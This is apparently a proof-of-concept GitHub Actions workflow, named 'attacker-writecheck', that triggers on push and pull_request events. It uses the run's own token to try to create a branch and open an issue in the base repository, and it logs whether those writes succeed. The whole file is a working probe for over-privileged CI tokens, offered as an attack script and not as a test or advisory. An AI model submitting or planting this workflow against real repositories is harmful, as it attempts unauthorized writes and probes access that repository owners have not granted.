name: attacker-writecheck
on: [push, pull_request]
jobs:
  wr:
    runs-on: ubuntu-latest
    steps:
      - name: what can this token do
        run: |
          echo "WPERM event=${{ github.event_name }} repo=${{ github.repository }}"
          code=$(curl -s -o /tmp/o -w "%{http_code}" -X POST \
            -H "Authorization: token ${{ github.token }}" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/${{ github.repository }}/git/refs \
            -d '{"ref":"refs/heads/poc-write-proof","sha":"${{ github.sha }}"}')
          echo "WPERM create-ref-in-base-repo=$code"
          echo "WPERM body=$(head -c 120 /tmp/o | tr -d '\n')"
          c2=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token ${{ github.token }}" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/${{ github.repository }}/issues \
            -d '{"title":"poc-write-proof","body":"write proof"}')
          echo "WPERM create-issue=$c2"
